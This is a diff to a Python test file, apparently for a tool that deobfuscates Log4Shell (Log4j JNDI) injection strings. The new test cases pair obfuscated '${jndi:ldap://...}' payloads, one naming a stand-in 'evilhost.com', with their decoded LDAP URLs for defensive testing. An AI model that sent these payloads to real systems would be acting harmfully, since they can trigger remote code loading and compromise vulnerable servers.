@@ -29,6 +29,10 @@ def test_deobfuscate(encoded, decoded):
          'ldap://example.com'),
         ('Dec 15 12:28:55 127.0.0.1 [qw_4:078ef1bc-1d0b-4e67-8223-75bee730368c] com.q1labs.core.shared.ariel.CustomKeyCreator: [WARN] [NOT:0000004000][172.31.79.90/- -] [-/- -]keyFromString failed. Expression for property Sender Host tried to return ${jndi:${lower:l}${lower:d}a${lower:p}://xf.world80.log4j.bin${upper:a}ryedge.io:80/callback} as class com.q1labs.core.dao.util.Host. Check the custom property definition to ensure it is the proper type.\n',
          'ldap://xf.world80.log4j.binaryedge.io:80/callback'),
+        ('${jndi:ldap://127.0.0.1#evilhost.com:1389/a}',
+         'ldap://127.0.0.1#evilhost.com:1389/a'),
+        ('/foo?query=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://example.com}',
+         'ldap://example.com'),
     ]
 )
 def test_strings(encoded, decoded):
